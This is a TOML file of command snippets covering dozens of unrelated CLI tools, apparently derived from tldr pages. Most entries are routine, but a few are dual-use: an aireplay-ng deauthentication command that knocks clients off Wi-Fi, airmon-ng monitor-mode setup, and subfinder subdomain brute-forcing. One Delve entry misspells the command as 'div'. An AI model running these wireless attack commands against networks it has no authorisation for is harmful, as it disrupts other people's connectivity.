  output = ""

[[snippets]]
  description = "Check style issues at the specific severity and higher"
  command = "vale --minAlertLevel=<suggestion|warning|error> <path/to/file>"
  output = ""

[[snippets]]
  description = "Check the style from `stdin`, specifying markup format"
  command = "cat <file.md> | vale --ext=.md"
  output = ""

[[snippets]]
  description = "List the current configuration"
  command = "vale ls-config"
  output = ""

[[snippets]]
  description = "Log in to Azure"
  command = "az login"
  output = ""

[[snippets]]
  description = "Manage azure subscription information"
  command = "az account"
  output = ""

[[snippets]]
  description = "List all Azure Managed Disks"
  command = "az disk list"
  output = ""

[[snippets]]
  description = "List all Azure virtual machines"
  command = "az vm list"
  output = ""

[[snippets]]
  description = "Manage Azure Kubernetes Services"
  command = "az aks"
  output = ""

[[snippets]]
  description = "Manage Azure Network resources"
  command = "az network"
  output = ""

[[snippets]]
  description = "Remove white borders on a PNM image"
  command = "pnmcrop -white <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Remove borders of the specified color that are on the top and left side of the image"
  command = "pnmcrop -bg-color <color> -top -left <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Determine the color of the borders to be removed by the color of the pixel in the specified corner"
  command = "pnmcrop -bg-corner <topleft|topright|bottomleft|bottomright> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Leave a border with a width of `n` pixels. Additionally, specify the behaviour if the image is entirely made out of background"
  command = "pnmcrop -margins <n> -blank-image <pass|minimize|maxcrop> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Start and watch the current directory"
  command = "gow run ."
  output = ""

[[snippets]]
  description = "Start the application with the specified arguments"
  command = "gow run . <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Watch subdirectories in verbose mode"
  command = "gow -v -w=<path/to/directory1,path/to/directory2,...> run ."
  output = ""

[[snippets]]
  description = "Watch the specified file extensions"
  command = "gow -e=<go,html> run ."
  output = ""

[[snippets]]
  description = "Display help"
  command = "gow -h"
  output = ""

[[snippets]]
  description = "Convert a PNM image file to XWD"
  command = "pnmtoxwd <path/to/input_file.pnm> > <path/to/output_file.xwd>"
  output = ""

[[snippets]]
  description = "Produce the output in the DirectColor format"
  command = "pnmtoxwd -directcolor <path/to/input_file.pnm> > <path/to/output_file.xwd>"
  output = ""

[[snippets]]
  description = "Set the color depth of the output to b bits"
  command = "pnmtoxwd -pseudodepth <b> <path/to/input_file.pnm> > <path/to/output_file.xwd>"
  output = ""

[[snippets]]
  description = "Send a specific number of disassociate packets given an access point's MAC address, a client's MAC address and an interface"
  command = "sudo aireplay-ng --deauth <count> --bssid <ap_mac> --dmac <client_mac> <interface>"
  output = ""

[[snippets]]
  description = "Decode an APK file"
  command = "apktool d <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Build an APK file from a directory"
  command = "apktool b <path/to/directory>"
  output = ""

[[snippets]]
  description = "Install and store a framework"
  command = "apktool if <path/to/framework.apk>"
  output = ""

[[snippets]]
  description = "Mount an encrypted filesystem. The initialization wizard will be started on the first execution"
  command = "cryfs <path/to/cipher_dir> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Unmount an encrypted filesystem"
  command = "cryfs-unmount <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Automatically unmount after ten minutes of inactivity"
  command = "cryfs --unmount-idle <10> <path/to/cipher_dir> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "List supported ciphers"
  command = "cryfs --show-ciphers"
  output = ""

[[snippets]]
  description = "Display the current filesystem label"
  command = "exfatlabel </dev/sda>"
  output = ""

[[snippets]]
  description = "Set the filesystem label"
  command = "exfatlabel </dev/sda> <new_label>"
  output = ""

[[snippets]]
  description = "Display a specific issue"
  command = "gh issue view <issue_number>"
  output = ""

[[snippets]]
  description = "Display a specific issue in the default web browser"
  command = "gh issue view <issue_number> --web"
  output = ""

[[snippets]]
  description = "Create a new issue in the default web browser"
  command = "gh issue create --web"
  output = ""

[[snippets]]
  description = "List the last 10 issues with the `bug` label"
  command = "gh issue list --limit <10> --label ""<bug>"""
  output = ""

[[snippets]]
  description = "List closed issues made by a specific user"
  command = "gh issue list --state closed --author <username>"
  output = ""

[[snippets]]
  description = "Display the status of issues relevant to the user, in a specific repository"
  command = "gh issue status --repo <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Reopen a specific issue"
  command = "gh issue reopen <issue_number>"
  output = ""

[[snippets]]
  description = "Replace a regex pattern in all files of the current directory, ignoring files on .ignore and .gitignore"
  command = "fastmod <regex_pattern> <replacement>"
  output = ""

[[snippets]]
  description = "Replace a regex pattern in case-insensitive mode in specific files or directories"
  command = "fastmod --ignore-case <regex_pattern> <replacement> -- <path/to/file path/to/directory ...>"
  output = ""

[[snippets]]
  description = "Replace a regex pattern in a specific directory in files filtered with a case-insensitive glob pattern"
  command = "fastmod <regex> <replacement> --dir <path/to/directory> --iglob <'**/*.{js,json}'>"
  output = ""

[[snippets]]
  description = "Replace for an exact string in .js or .json files"
  command = "fastmod --fixed-strings <exact_string> <replacement> --extensions <json,js>"
  output = ""

[[snippets]]
  description = "Replace for an exact string without prompt for a confirmation (disables regular expressions)"
  command = "fastmod --accept-all --fixed-strings <exact_string> <replacement>"
  output = ""

[[snippets]]
  description = "Replace for an exact string without prompt for a confirmation, printing changed files"
  command = "fastmod --accept-all --print-changed-files --fixed-strings <exact_string> <replacement>"
  output = ""

[[snippets]]
  description = "Grant a user access to a resource"
  command = "pio access grant <guest|maintainer|admin> <username> <resource_urn>"
  output = ""

[[snippets]]
  description = "Remove a user's access to a resource"
  command = "pio access revoke <username> <resource_urn>"
  output = ""

[[snippets]]
  description = "Show all resources that a user or team has access to and the access level"
  command = "pio access list <username>"
  output = ""

[[snippets]]
  description = "Restrict access to a resource to specific users or team members"
  command = "pio access private <resource_urn>"
  output = ""

[[snippets]]
  description = "Allow all users access to a resource"
  command = "pio access public <resource_urn>"
  output = ""

[[snippets]]
  description = "Generate an analyzer from a flex file, storing it to the file `lex.yy.c`"
  command = "lex <analyzer.l>"
  output = ""

[[snippets]]
  description = "Write analyzer to `stdout`"
  command = "lex -<-stdout|t> <analyzer.l>"
  output = ""

[[snippets]]
  description = "Specify the output file"
  command = "lex <analyzer.l> -o <analyzer.c>"
  output = ""

[[snippets]]
  description = "Generate a [B]atch scanner instead of an interactive scanner"
  command = "lex -B <analyzer.l>"
  output = ""

[[snippets]]
  description = "Compile a C file generated by Lex"
  command = "cc <path/to/lex.yy.c> --output <executable>"
  output = ""

[[snippets]]
  description = "Capture a screenshot of the entire desktop"
  command = "spectacle"
  output = ""

[[snippets]]
  description = "Capture a screenshot of the active window"
  command = "spectacle --activewindow"
  output = ""

[[snippets]]
  description = "Capture a screenshot of a specific region"
  command = "spectacle --region"
  output = ""

[[snippets]]
  description = "Build the artifacts"
  command = "skaffold build -f <skaffold.yaml>"
  output = ""

[[snippets]]
  description = "Build and deploy your app every time your code changes"
  command = "skaffold dev -f <skaffold.yaml>"
  output = ""

[[snippets]]
  description = "Run a pipeline file"
  command = "skaffold run -f <skaffold.yaml>"
  output = ""

[[snippets]]
  description = "Run a diagnostic on Skaffold"
  command = "skaffold diagnose -f <skaffold.yaml>"
  output = ""

[[snippets]]
  description = "Deploy the artifacts"
  command = "skaffold deploy -f <skaffold.yaml>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr todo"
  output = ""

[[snippets]]
  description = "[c]reate a backup archive of one or more files or directories, specifying the cryptographic key and the cache directory"
  command = "tarsnap -c --keyfile <path/to/key_file> --cachedir <path/to/cache_directory> -f <archive_name> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Display how much data would be uploaded"
  command = "tarsnap -c --dry-run --print-stats --keyfile <path/to/key_file> --cachedir <path/to/cache_directory> -f <archive_name> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "List stored archives"
  command = "tarsnap --list-archives --keyfile <path/to/key_file>"
  output = ""

[[snippets]]
  description = "[d]elete a specific archive"
  command = "tarsnap -d --keyfile <path/to/key_file> --cachedir <path/to/cache_directory> -f <archive_name>"
  output = ""

[[snippets]]
  description = "Lis[t] the contents of a specific archive in [v]erbose mode"
  command = "tarsnap -tv --keyfile <path/to/key_file> -f <archive_name>"
  output = ""

[[snippets]]
  description = "Restore one or more files or directories from a specific archive"
  command = "tarsnap -x --keyfile <path/to/key_file> -f <archive_name> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Copy an archive"
  command = "tarsnap -c --keyfile <path/to/key_file> -f <new_archive_name> @@<source_archive_name>"
  output = ""

[[snippets]]
  description = "Display the number of available processing units"
  command = "nproc"
  output = ""

[[snippets]]
  description = "Display the number of installed processing units, including any inactive ones"
  command = "nproc --all"
  output = ""

[[snippets]]
  description = "If possible, subtract a given number of units from the returned value"
  command = "nproc --ignore <count>"
  output = ""

[[snippets]]
  description = "Compile and begin debugging the main package in the current directory (by default, with no arguments)"
  command = "dlv debug"
  output = ""

[[snippets]]
  description = "Compile and begin debugging a specific package"
  command = "dlv debug <package> <arguments>"
  output = ""

[[snippets]]
  description = "Compile a test binary and begin debugging the compiled program"
  command = "dlv test"
  output = ""

[[snippets]]
  description = "Connect to a headless debug server"
  command = "dlv connect <ip_address>"
  output = ""

[[snippets]]
  description = "Attach to a running process and begin debugging"
  command = "div attach <pid>"
  output = ""

[[snippets]]
  description = "Compile and begin tracing a program"
  command = "dlv trace <package> --regexp '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Display all filesystems and their disk usage using 512-byte units"
  command = "df"
  output = ""

[[snippets]]
  description = "Display the filesystem and its disk usage containing the given file or directory"
  command = "df <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Use 1024-byte units when writing space figures"
  command = "df -k"
  output = ""

[[snippets]]
  description = "Display information in a portable way"
  command = "df -P"
  output = ""

[[snippets]]
  description = "Run a function"
  command = "aws lambda invoke --function-name <name> <path/to/response.json>"
  output = ""

[[snippets]]
  description = "Run a function with an input payload in JSON format"
  command = "aws lambda invoke --function-name <name> --payload <json> <path/to/response.json>"
  output = ""

[[snippets]]
  description = "List functions"
  command = "aws lambda list-functions"
  output = ""

[[snippets]]
  description = "Display the configuration of a function"
  command = "aws lambda get-function-configuration --function-name <name>"
  output = ""

[[snippets]]
  description = "List function aliases"
  command = "aws lambda list-aliases --function-name <name>"
  output = ""

[[snippets]]
  description = "Display the reserved concurrency configuration for a function"
  command = "aws lambda get-function-concurrency --function-name <name>"
  output = ""

[[snippets]]
  description = "List which AWS services can invoke the function"
  command = "aws lambda get-policy --function-name <name>"
  output = ""

[[snippets]]
  description = "View a compressed file"
  command = "xzmore <path/to/file>"
  output = ""

[[snippets]]
  description = "Take a list of file names from `stdin` and add them [o]nto an archive in cpio's binary format"
  command = "echo ""<path/to/file1 path/to/file2 ...>"" | cpio -o > <archive.cpio>"
  output = ""

[[snippets]]
  description = "Copy all files and directories in a directory and add them [o]nto an archive, in [v]erbose mode"
  command = "find <path/to/directory> | cpio -ov > <archive.cpio>"
  output = ""

[[snippets]]
  description = "P[i]ck all files from an archive, generating [d]irectories where needed, in [v]erbose mode"
  command = "cpio -idv < <archive.cpio>"
  output = ""

[[snippets]]
  description = "Initialize an encrypted filesystem"
  command = "gocryptfs -init <path/to/cipher_dir>"
  output = ""

[[snippets]]
  description = "Mount an encrypted filesystem"
  command = "gocryptfs <path/to/cipher_dir> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Mount with the explicit master key instead of password"
  command = "gocryptfs --masterkey <path/to/cipher_dir> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Change the password"
  command = "gocryptfs --passwd <path/to/cipher_dir>"
  output = ""

[[snippets]]
  description = "Make an encrypted snapshot of a plain directory"
  command = "gocryptfs --reverse <path/to/plain_dir> <path/to/cipher_dir>"
  output = ""

[[snippets]]
  description = "Convert a MDA file to a PBM image"
  command = "mdatopbm <path/to/image.mda> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Invert the colors in the input image"
  command = "mdatopbm -i <path/to/image.mda> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Double the input image's height"
  command = "mdatopbm -d <path/to/image.mda> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Find the processes that have a given file open"
  command = "lsof <path/to/file>"
  output = ""

[[snippets]]
  description = "Find the process that opened a local internet port"
  command = "lsof -i :<port>"
  output = ""

[[snippets]]
  description = "Only output the process ID (PID)"
  command = "lsof -t <path/to/file>"
  output = ""

[[snippets]]
  description = "List files opened by the given user"
  command = "lsof -u <username>"
  output = ""

[[snippets]]
  description = "List files opened by the given command or process"
  command = "lsof -c <process_or_command_name>"
  output = ""

[[snippets]]
  description = "List files opened by a specific process, given its PID"
  command = "lsof -p <PID>"
  output = ""

[[snippets]]
  description = "List open files in a directory"
  command = "lsof +D <path/to/directory>"
  output = ""

[[snippets]]
  description = "Find the process that is listening on a local IPv6 TCP port and don't convert network or port numbers"
  command = "lsof -i6TCP:<port> -sTCP:LISTEN -n -P"
  output = ""

[[snippets]]
  description = "Generate a SHA-512 timestamp request of a specific file and output to `file.tsq`"
  command = "openssl ts -query -data <path/to/file> -sha512 -out <path/to/file.tsq>"
  output = ""

[[snippets]]
  description = "Check the date and metadata of a specific timestamp response file"
  command = "openssl ts -reply -in <path/to/file.tsr> -text"
  output = ""

[[snippets]]
  description = "Verify a timestamp request file and a timestamp response file from the server with an SSL certificate file"
  command = "openssl ts -verify -in <path/to/file.tsr> -queryfile <path/to/file.tsq> -partial_chain -CAfile <path/to/cert.pem>"
  output = ""

[[snippets]]
  description = "Create a timestamp response for request using key and signing certificate and output it to `file.tsr`"
  command = "openssl ts -reply -queryfile <path/to/file.tsq> -inkey <path/to/tsakey.pem> -signer tsacert.pem -out <path/to/file.tsr>"
  output = ""

[[snippets]]
  description = "Print the lines in the specified `.csv` file that match a SQL query to `stdout`"
  command = "textql -sql ""<SELECT * FROM filename>"" <path/to/filename.csv>"
  output = ""

[[snippets]]
  description = "Query `.tsv` file"
  command = "textql -dlm=tab -sql ""<SELECT * FROM filename>"" <path/to/filename.tsv>"
  output = ""

[[snippets]]
  description = "Query file with header row"
  command = "textql -dlm=<delimiter> -header -sql ""<SELECT * FROM filename>"" <path/to/filename.csv>"
  output = ""

[[snippets]]
  description = "Read data from `stdin`"
  command = "cat <path/to/file> | textql -sql ""<SELECT * FROM stdin>"""
  output = ""

[[snippets]]
  description = "Join two files on a specified common column"
  command = "textql -header -sql ""SELECT * FROM <path/to/file1> JOIN <file2> ON <path/to/file1>.<c1> = <file2>.<c1> LIMIT <10>"" -output-header <path/to/file1.csv> <path/to/file2.csv>"
  output = ""

[[snippets]]
  description = "Format output using an output delimiter with an output header line"
  command = "textql -output-dlm=<delimiter> -output-header -sql ""SELECT <column> AS <alias> FROM <filename>"" <path/to/filename.csv>"
  output = ""

[[snippets]]
  description = "Authorize Google Cloud access for the `gcloud` CLI with Google Cloud user credentials and set the current account as active"
  command = "gcloud auth login"
  output = ""

[[snippets]]
  description = "Authorize Google Cloud access similar to `gcloud auth login` but with service account credentials"
  command = "gcloud auth activate-service-account"
  output = ""

[[snippets]]
  description = "Manage Application Default Credentials (ADC) for Cloud Client Libraries"
  command = "gcloud auth application-default"
  output = ""

[[snippets]]
  description = "Display a list of Google Cloud accounts currently authenticated on your system"
  command = "gcloud auth list"
  output = ""

[[snippets]]
  description = "Display the current account's access token"
  command = "gcloud auth print-access-token"
  output = ""

[[snippets]]
  description = "Remove access credentials for an account"
  command = "gcloud auth revoke"
  output = ""

[[snippets]]
  description = "Find subdomains for a specific [d]omain"
  command = "subfinder -d <example.com>"
  output = ""

[[snippets]]
  description = "Show only the subdomains found"
  command = "subfinder --silent -d <example.com>"
  output = ""

[[snippets]]
  description = "Use a brute-force attack to find subdomains"
  command = "subfinder -d <example.com> -b"
  output = ""

[[snippets]]
  description = "Remove wildcard subdomains"
  command = "subfinder -nW -d <example.com>"
  output = ""

[[snippets]]
  description = "Use a given comma-separated list of [r]esolvers"
  command = "subfinder -r <8.8.8.8,1.1.1.1,...> -d <example.com>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xz"
  output = ""

[[snippets]]
  description = "Link your mullvad account with the specified account number"
  command = "mullvad account set <account_number>"
  output = ""

[[snippets]]
  description = "Enable LAN access while VPN is on"
  command = "mullvad lan set allow"
  output = ""

[[snippets]]
  description = "Establish the VPN tunnel"
  command = "mullvad connect"
  output = ""

[[snippets]]
  description = "Check status of VPN tunnel"
  command = "mullvad status"
  output = ""

[[snippets]]
  description = "Start a server to distribute e-books. Access at <http://localhost:8080>"
  command = "calibre-server"
  output = ""

[[snippets]]
  description = "Start server on different port. Access at <http://localhost:port>"
  command = "calibre-server --port <port>"
  output = ""

[[snippets]]
  description = "Password protect the server"
  command = "calibre-server --username <username> --password <password>"
  output = ""

[[snippets]]
  description = "Start an authenticated session"
  command = "kcadm.sh config credentials --server <host> --realm <realm_name> --user <username> --password <password>"
  output = ""

[[snippets]]
  description = "Create a user"
  command = "kcadm.sh create users -s username=<username> -r <realm_name>"
  output = ""

[[snippets]]
  description = "List all realms"
  command = "kcadm.sh get realms"
  output = ""

[[snippets]]
  description = "Update a realm with JSON config"
  command = "kcadm.sh update realms/<realm_name> -f <path/to/file.json>"
  output = ""

[[snippets]]
  description = "Remove files or directories from specified locations and place them in the graveyard"
  command = "rip <path/to/file_or_directory> <path/to/another/file_or_directory>"
  output = ""

[[snippets]]
  description = "Interactively remove files or directories, with a prompt before every removal"
  command = "rip --inspect <path/to/file_or_directory> <path/to/another/file_or_directory>"
  output = ""

[[snippets]]
  description = "List all files and directories in the graveyard that were originally within the current directory"
  command = "rip --seance"
  output = ""

[[snippets]]
  description = "Permanently delete every file and directory in the graveyard"
  command = "rip --decompose"
  output = ""

[[snippets]]
  description = "Put back the files and directories which were affected by the most recent removal"
  command = "rip --unbury"
  output = ""

[[snippets]]
  description = "Put back every file and directory that is listed by `rip --seance`"
  command = "rip --seance --unbury"
  output = ""

[[snippets]]
  description = "Dump the local package database"
  command = "tlmgr dump-tlpdb --local"
  output = ""

[[snippets]]
  description = "Dump the remote package database"
  command = "tlmgr dump-tlpdb --remote"
  output = ""

[[snippets]]
  description = "Dump the local package database as JSON"
  command = "tlmgr dump-tlpdb --local --json"
  output = ""

[[snippets]]
  description = "List wireless devices and their statuses"
  command = "sudo airmon-ng"
  output = ""

[[snippets]]
  description = "Turn on monitor mode for a specific device"
  command = "sudo airmon-ng start <wlan0>"
  output = ""

[[snippets]]
  description = "Kill disturbing processes that use wireless devices"
  command = "sudo airmon-ng check kill"
  output = ""

[[snippets]]
  description = "Turn off monitor mode for a specific network interface"
  command = "sudo airmon-ng stop <wlan0mon>"
  output = ""

[[snippets]]
  description = "List domains"
  command = "cli53 list"
  output = ""

[[snippets]]
  description = "Create a domain"
  command = "cli53 create <mydomain.com> --comment ""<comment>"""
  output = ""

[[snippets]]
  description = "Export a bind zone file to `stdout`"
  command = "cli53 export <mydomain.com>"
  output = ""

[[snippets]]
  description = "Create a `www` subdomain pointing to a relative record in the same zone"
  command = "cli53 <rc|rrcreate> <mydomain.com> <'www 300 CNAME lb'>"
  output = ""

[[snippets]]
  description = "Create a `www` subdomain pointing to an external address (must end with a dot)"
  command = "cli53 <rc|rrcreate> <mydomain.com> <'www 300 CNAME lb.externalhost.com.'>"
  output = ""

[[snippets]]
  description = "Create a `www` subdomain pointing to an IP address"
  command = "cli53 <rc|rrcreate> <mydomain.com> <'www 300 A 150.130.110.1'>"
  output = ""

[[snippets]]
  description = "Replace a `www` subdomain pointing to a different IP"
  command = "cli53 <rc|rrcreate> --replace <'www 300 A 150.130.110.2'>"
  output = ""

[[snippets]]
  description = "Delete a record A"
  command = "cli53 <rd|rrdelete> <mydomain.com> <www> <A>"
  output = ""

[[snippets]]
  description = "Compile a binary crate"
  command = "rustc <path/to/main.rs>"
  output = ""

[[snippets]]
  description = "Compile with optimizations (`s` means optimize for binary size; `z` is the same with even more optimizations)"
  command = "rustc -C lto -C opt-level=<0|1|2|3|s|z> <path/to/main.rs>"
  output = ""

[[snippets]]
  description = "Compile with debugging information"
  command = "rustc -g <path/to/main.rs>"
  output = ""

[[snippets]]
  description = "Explain an error message"
  command = "rustc --explain <error_code>"
  output = ""

[[snippets]]
  description = "Compile with architecture-specific optimizations for the current CPU"
  command = "rustc -C target-cpu=<native> <path/to/main.rs>"
  output = ""

[[snippets]]
  description = "Display the target list (Note: you have to add a target using `rustup` first to be able to compile for it)"
  command = "rustc --print target-list"
  output = ""

[[snippets]]
  description = "Compile for a specific target"
  command = "rustc --target <target_triple> <path/to/main.rs>"
  output = ""

[[snippets]]
  description = "Copy PGM file from `stdin` to `stderr`"
  command = "pgmtopgm"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pgmtopgm -version"
  output = ""

[[snippets]]
  description = "Stack the planes of the specified PAM images in the specified order"
  command = "pamstack <path/to/image1.pam path/to/image2.pam ...> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Specify the tuple type name of the output PAM file (maximum of 255 characters)"
  command = "pamstack -tupletype <tuple_type> <path/to/image1.pam path/to/image2.pam ...> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Start the record (creates a preliminary link file)"
  command = "in-toto-record start -n <path/to/edit_file1 path/to/edit_file2 ...> -k <path/to/key_file> -m <.>"
  output = ""

[[snippets]]
  description = "Stop the record (expects a preliminary link file)"
  command = "in-toto-record stop -n <path/to/edit_file1 path/to/edit_file2 ...> -k <path/to/key_file> -p <.>"
  output = ""

[[snippets]]
  description = "Display the status of every service"
  command = "sudo gitlab-ctl status"
  output = ""

[[snippets]]
  description = "Display the status of a specific service"
  command = "sudo gitlab-ctl status <nginx>"
  output = ""

[[snippets]]
  description = "Restart every service"
  command = "sudo gitlab-ctl restart"
  output = ""

[[snippets]]
  description = "Restart a specific service"
  command = "sudo gitlab-ctl restart <nginx>"
  output = ""

[[snippets]]
  description = "Display the logs of every service and keep reading until `Ctrl + C` is pressed"
  command = "sudo gitlab-ctl tail"
  output = ""

[[snippets]]
  description = "Display the logs of a specific service"
  command = "sudo gitlab-ctl tail <nginx>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr clang++"
  output = ""

[[snippets]]
  description = "Read a PPM image from the input file, convert it to three subsampled Abekas YUV image and store these images to output files starting with the specified basename"
  command = "ppmtoyuvsplit <basename> <path/to/input_file.ppm>"
  output = ""

[[snippets]]
  description = "Disable the ability to commit changes of a local file"
  command = "git lock <path/to/file>"
  output = ""

[[snippets]]
  description = "Get information about a domain name"
  command = "whois <example.com>"
  output = ""

[[snippets]]
  description = "Get information about an IP address"
  command = "whois <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Get abuse contact for an IP address"
  command = "whois -b <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Execute the specified commands if the condition command's exit status is zero"
  command = "if <condition_command>; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "Execute the specified commands if the condition command's exit status is not zero"
  command = "if ! <condition_command>; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "Execute the first specified commands if the condition command's exit status is zero otherwise execute the second specified commands"
  command = "if <condition_command>; then <echo ""Condition is true"">; else <echo ""Condition is false"">; fi"
  output = ""

[[snippets]]
  description = "Check whether a [f]ile exists"
  command = "if [[ -f <path/to/file> ]]; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "Check whether a [d]irectory exists"
  command = "if [[ -d <path/to/directory> ]]; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "Check whether a file or directory [e]xists"
  command = "if [[ -e <path/to/file_or_directory> ]]; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "Check whether a variable is defined"
  command = "if [[ -n ""$<variable>"" ]]; then <echo ""Condition is true"">; fi"
  output = ""

[[snippets]]
  description = "List all possible conditions (`test` is an alias to `[`; both are commonly used with `if`)"
  command = "man ["
  output = ""

[[snippets]]
  description = "Send a file to a specific node"
  command = "sudo tailscale file cp <path/to/file> <hostname|ip>:"
  output = ""

[[snippets]]
  description = "Store files that were sent to the current node into a specific directory"
  command = "sudo tailscale file get <path/to/directory>"
  output = ""

[[snippets]]
  description = "Generate a configuration script from `configure.ac` (if present) or `configure.in` and save this script to `configure`"
  command = "autoconf"
  output = ""

[[snippets]]
  description = "Generate a configuration script from the specified template; output to `stdout`"
  command = "autoconf <template-file>"
  output = ""

[[snippets]]
  description = "Generate a configuration script from the specified template (even if the input file has not changed) and write the output to a file"
  command = "autoconf --force --output=<outfile> <template-file>"
  output = ""

[[snippets]]
  description = "Process a `grap` file and save the output file for future processing with `pic` and `groff`"
  command = "grap <path/to/input.grap> > <path/to/output.pic>"
  output = ""

[[snippets]]
  description = "Typeset a `grap` file to PDF using the [me] macro package, saving the output to a file"
  command = "grap <path/to/input.grap> | pic -T <pdf> | groff -<me> -T <pdf> > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Generate a rainbow consisting of the specified colors"
  command = "ppmrainbow <color1 color2 ...> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Specify the size of the output in pixels"
  command = "ppmrainbow -width <width> -height <height> <color1 color2 ...> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "End the rainbow with the last color specified, do not repeat the first color"
  command = "ppmrainbow -norepeat <color1 color2 ...> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Print a license to `stdout`, using the defaults (auto-detected author name, and current year)"
  command = "license <license_name>"
  output = ""

[[snippets]]
  description = "Generate a license and save it to a file"
  command = "license -o <path/to/file> <license_name>"
  output = ""

[[snippets]]
  description = "List all available licenses"
  command = "license ls"
  output = ""

[[snippets]]
  description = "Generate a license with custom author name and year"
  command = "license --name <author> --year <release_year> <license_name>"
  output = ""

[[snippets]]
  description = "Send the patches between the current branch and its upstream to a pastebin using `pastebinit`"
  command = "git paste"
  output = ""

[[snippets]]
  description = "Pass options to `git format-patch` in order to select a different set of commits (`@^` selects the parent of HEAD, and so the currently checked out commit is sent)"
  command = "git paste <@^>"
  output = ""

[[snippets]]
  description = "Display general help, including the list of subcommands"
  command = "xml --help"
  output = ""

[[snippets]]
  description = "Execute a subcommand with input from a file or URI, printing to `stdout`"
  command = "xml <subcommand> <options> <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Execute a subcommand using `stdin` and `stdout`"
  command = "xml <subcommand> <options>"
  output = ""

[[snippets]]
  description = "Execute a subcommand with input from a file or URI and output to a file"
  command = "xml <subcommand> <options> <path/to/input.xml|URI> > <path/to/output>"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "xml <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "xml --version"
  output = ""

[[snippets]]
  description = "Visit a website"
  command = "lynx <example.com>"
  output = ""

[[snippets]]
  description = "Apply restrictions for anonymous account"
  command = "lynx -anonymous <example.com>"
  output = ""

[[snippets]]
  description = "Turn on mouse support, if available"
  command = "lynx -use_mouse <example.com>"
  output = ""

[[snippets]]
  description = "Force color mode on, if available"
  command = "lynx -color <example.com>"
  output = ""

[[snippets]]
  description = "Open a link, using a specific file to read and write cookies"
  command = "lynx -cookie_file=<path/to/file> <example.com>"
  output = ""

[[snippets]]
  description = "Navigate forwards and backwards through the links on a page"
  command = "<Up arrow key|Down arrow key>"
  output = ""

[[snippets]]
  description = "Go back to the previously displayed page"
  command = "<Left arrow key|u>"
  output = ""

[[snippets]]
  description = "Exit"
  command = "q + y"
  output = ""

[[snippets]]
  description = "Build the package in the current directory"
  command = "sbuild"
  output = ""

[[snippets]]
  description = "Build the given package"
  command = "sbuild <package>"
  output = ""

[[snippets]]
  description = "Build for a certain distribution"
  command = "sbuild --dist <distribution>"
  output = ""

[[snippets]]
  description = "Build using custom dependencies (if a directory is passed, all files ending with `.deb` are used)"
  command = "sbuild --extra-package <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Run a shell in case of build failure to further investigate"
  command = "sbuild --build-failed-commands=%SBUILD_SHELL"
  output = ""

[[snippets]]
  description = "Cross build for a certain architecture"
  command = "sbuild --host <architecture>"
  output = ""

[[snippets]]
  description = "Build for the given native architecture"
  command = "sbuild --arch <architecture>"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a Zinc bitmap"
  command = "pbmtozinc <path/to/image.pbm> > <path/to/output.zinc>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gh ssh-key"
  output = ""

[[snippets]]
  description = "List SSH keys for the currently authenticated user"
  command = "gh ssh-key list"
  output = ""

[[snippets]]
  description = "Add an SSH key to the currently authenticated user's account"
  command = "gh ssh-key add <path/to/key.pub>"
  output = ""

[[snippets]]
  description = "Add an SSH key to the currently authenticated user's account with a specific title"
  command = "gh ssh-key add --title <title> <path/to/key.pub>"
  output = ""

[[snippets]]
  description = "Print the uncompressed contents of a `gzip` archive to `stdout`"
  command = "zcat <file.txt.gz>"
  output = ""

[[snippets]]
  description = "Print compression details of a `gzip` archive to `stdout`"
  command = "zcat -l <file.txt.gz>"
  output = ""

[[snippets]]
  description = "Write the current directory's listing to an XML document"
  command = "xml list > <path/to/dir_list.xml>"
  output = ""

[[snippets]]
  description = "Write the specified directory's listing to an XML document"
  command = "xml list <path/to/directory> > <path/to/dir_list.xml>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml list --help"
  output = ""

[[snippets]]
  description = "Convert a graph from `gv` to `gxl` format"
  command = "gv2gxl -o <output.gxl> <input.gv>"
  output = ""

